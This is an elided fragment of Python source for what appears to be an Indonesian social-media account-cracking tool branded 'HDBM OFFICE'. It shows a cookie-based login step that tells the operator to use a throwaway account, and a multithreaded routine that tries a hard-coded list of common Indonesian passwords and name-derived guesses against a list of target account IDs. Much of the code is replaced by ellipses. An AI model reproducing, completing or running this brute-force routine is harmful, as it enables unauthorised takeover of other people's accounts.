...
#<-[ Logo-Banener ]->#
def LogoBanner(): BersihkanLayar();
█   █
███
█   █ >HDBM OFFICE<
#<-[ Login-Cookies ]->#
def LoginCookies():
	BersihkanLayar();LogoBanner();_____animasi__berjalan_____(f'{X} => {P}TUMBAL NYAA KAWAN JANGAN PAKE AKUN UTAMA NTAR NANGIS !');_____animasi__berjalan_____(f'{M}<------------------------------------------------------------>')
	cok = input(f'{X} => {X}')
	try:
...
def passwrd():
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			frs = nmf.split(' ')[0]
			pwv = ['kamu nanya','kamunanya','kata sandi','apacoba','kamar mandi','google','freefire','epep123','nggaktau']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
